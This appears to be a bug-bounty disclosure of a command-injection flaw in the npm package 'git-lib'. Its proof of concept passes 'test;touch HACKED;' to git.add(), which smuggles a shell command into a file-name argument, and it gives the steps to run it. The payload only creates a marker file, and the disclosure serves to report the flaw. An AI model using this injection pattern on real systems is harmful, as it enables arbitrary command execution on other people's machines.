# Overview

The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check.

## Proof of Concept (Credit: [Mik317](https://huntr.dev/app/users/Mik317))

1. Create the following PoC file:

```js
// poc.js
var git = require("git-lib");
git
  .add("test;touch HACKED;")
  .then(function () {
    /** successfully added **/
  })
  .catch(function (err) {
    /** unsuccessful **/
  });
```

2. Check there aren't files called `HACKED`
3. Execute the following commands in another terminal:

```bash
npm i git-lib # Install affected module
git init # Avoid problems with *git*
node poc.js #  Run the PoC
```

4. Recheck the files: now `HACKED` has been created
